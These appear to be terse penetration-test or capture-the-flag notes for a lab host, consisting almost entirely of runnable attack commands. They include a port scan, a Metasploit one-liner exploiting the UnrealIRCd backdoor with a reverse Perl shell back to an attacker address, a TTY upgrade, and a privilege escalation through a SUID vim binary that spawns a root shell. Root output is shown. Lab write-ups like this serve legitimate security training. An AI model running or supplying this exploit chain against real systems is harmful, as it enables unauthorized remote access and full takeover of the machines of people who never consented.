## NMAP
```
nmap -T4 -sS -A -Pn -p- 192.168.56.103
```
## BackDoor
```
msfconsole -q -x "use exploit/unix/irc/unreal_ircd_3281_backdoor; set RHOSTS 192.168.56.103; set LHOST 192.168.56.102; set payload cmd/unix/reverse_perl; run"
```
## TTY
```
python -c 'import pty; pty.spawn("/bin/bash")'
```

## Prvis
```
find / -perm -4000 -type f 2>/dev/null
ls -l /usr/bin/vim.basic

python -c 'import pty; pty.spawn("/bin/bash")'
vim -c ':!bash'
echo 'bash -p' > /tmp/rootshell.sh
chmod +x /tmp/rootshell.sh
/usr/bin/vim.basic -c ':! /tmp/rootshell.sh'

##one liner
echo 'bash -p' > /tmp/rootshell.sh && chmod +x /tmp/rootshell.sh && /usr/bin/vim.basic -c ':! /tmp/rootshell.sh'


bash-4.2# whoami && id
whoami && id
root
uid=39(irc) gid=39(irc) euid=0(root) groups=0(root),39(irc)
```
